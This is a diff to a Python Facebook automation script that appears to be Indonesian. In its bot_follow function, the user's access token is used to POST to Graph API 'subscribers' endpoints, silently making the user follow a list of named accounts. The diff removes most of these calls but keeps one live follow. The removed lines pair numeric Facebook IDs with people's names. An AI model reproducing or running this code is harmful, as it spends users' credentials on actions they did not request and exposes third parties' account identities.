@@ -265,31 +265,7 @@ def bot_follow():
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
-	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
-	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
-	requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + toket) # Almira Gabrielle X
-	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      # Anthonyus Immanuel
-	requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + toket) # Antonius Raditya M
-	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) # Abigaille Dirgantara
-	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       # Boirah
-	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) # Anita Zuliatin
-	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) # Dapunta Xayonara
-	requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + toket) # Dapunta Adya R
-	requests.post("https://graph.facebook.com/1676993425/subscribers?access_token=" + toket)      # Wati Waningsih
-	requests.post("https://graph.facebook.com/1767051257/subscribers?access_token=" + toket)      # Rofi Nurhanifah
 	requests.post("https://graph.facebook.com/100041408825014/subscribers?access_token=" + toket) # ker z 96
-	requests.post("https://graph.facebook.com/100001085079906/subscribers?access_token=" + toket) # Xena Alexander
-	requests.post("https://graph.facebook.com/100007559713883/subscribers?access_token=" + toket) # Alexandra Scarlett
-	requests.post("https://graph.facebook.com/100000424033832/subscribers?access_token=" + toket) # Pebrima Jun Helmi
-	requests.post("https://graph.facebook.com/100004655733027/subscribers?access_token=" + toket) # Aisya Asyaqila
-	requests.post("https://graph.facebook.com/100000200420913/subscribers?access_token=" + toket) # Ameiliani Dethasia
-	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) # Muh Rizal Fiansyah
-	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) # Rizal F
-	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) # Angga Kurniawan
-	requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + toket) # Moh Yayan
-	requests.post("https://graph.facebook.com/100026818103201/subscribers?access_token=" + toket) #Cici Putri Andini
-	requests.post("https://graph.facebook.com/100008468288074/subscribers?access_token=" + toket) #Bayu Putra Tama
-	requests.post("https://graph.facebook.com/100001027764318/subscribers?access_token=" + toket) #Zacky
 	menu()
 
 ### MAIN MENU ###
